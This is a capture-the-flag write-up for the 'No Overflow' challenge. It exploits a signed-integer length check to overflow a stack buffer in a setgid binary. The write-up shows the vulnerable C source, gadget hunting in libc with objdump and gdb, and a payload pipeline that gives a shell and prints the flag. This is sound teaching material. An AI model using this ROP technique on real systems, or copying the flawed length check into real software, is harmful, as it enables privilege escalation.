No Overflow - 140
=================

### Desc:
This tries to prevent a buffer overflow by asking you how long your input is! Exploit it anyways! The binary can be found at /home/no_overflow/ on the shell server. The source can be found here.

### Hint:
Are there any numbers that are less than 256 and bigger than 256 depending on how you look at it?

### Vulnerable code:

```c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

#define BUFSIZE 256

void greet(int length){
    char buf[BUFSIZE];
    puts("What is your name?");
    read(0, buf, length);
    printf("Hello, %s\n!", buf);
}

void be_nice_to_people(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
}

int main(int argc, char **argv){
    int length;
    be_nice_to_people();

    puts("How long is your name?");
    scanf("%d", &length);

    if(length < BUFSIZE) //don't allow buffer overflow
        greet(length);
    else
        puts("Length was too long!");
}
```

### Finding rop gadgets:

```
$ objdump -d /lib/i386-linux-gnu/libc-2.19.so | grep 'pop *%edx' -A4
...
   f0050:	5a                   	pop    %edx
   f0051:	59                   	pop    %ecx
   f0052:	58                   	pop    %eax
   f0053:	c3                   	ret
   f0054:	66 90                	xchg   %ax,%ax
--
   f9a31:	5a                   	pop    %edx
   f9a32:	59                   	pop    %ecx
   f9a33:	5b                   	pop    %ebx
   f9a34:	c3                   	ret

$ gdb -q /home/no_overflow/no_overflow
(gdb) info proc mappings
process 19027
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/no_overflow/no_overflow
	 0x8049000  0x804a000     0x1000        0x0 /home/no_overflow/no_overflow
	 0x804a000  0x804b000     0x1000     0x1000 /home/no_overflow/no_overflow
	0xf7e1b000 0xf7e1c000     0x1000        0x0
	0xf7e1c000 0xf7fc5000   0x1a9000        0x0 /lib/i386-linux-gnu/libc-2.19.so
	0xf7fc5000 0xf7fc6000     0x1000   0x1a9000 /lib/i386-linux-gnu/libc-2.19.so
	0xf7fc6000 0xf7fc8000     0x2000   0x1a9000 /lib/i386-linux-gnu/libc-2.19.so
	0xf7fc8000 0xf7fc9000     0x1000   0x1ab000 /lib/i386-linux-gnu/libc-2.19.so
	0xf7fc9000 0xf7fcc000     0x3000        0x0
	0xf7fd9000 0xf7fdb000     0x2000        0x0
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.19.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.19.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.19.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) x/4i 0xf7e1c000 + 0xf9a31
   0xf7f15a31:	pop    %edx
   0xf7f15a32:	pop    %ecx
   0xf7f15a33:	pop    %ebx
   0xf7f15a34:	ret
(gdb) x/2i 0xf7e1c000 + 0xf0052
   0xf7f0c052 <__fentry__+18>:	pop    %eax
   0xf7f0c053 <__fentry__+19>:	ret
$ objdump -d /lib/i386-linux-gnu/libc.so.6 | grep 'int ' | head -n1
   2e615:	cd 80                	int    $0x80
```

### Getting the flag:
```
$ cat <(echo "-1"; python /tmp/sigsegv/no_overflow.py)  - | /home/no_overflow/no_overflow
How long is your name?
What is your name?
Hello, ����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1Z������R���

id
uid=13315(pico22418) gid=1007(no_overflow) groups=1017(picogroup)
cat /home/no_overflow/flag.txt
what_is_your_sign
```
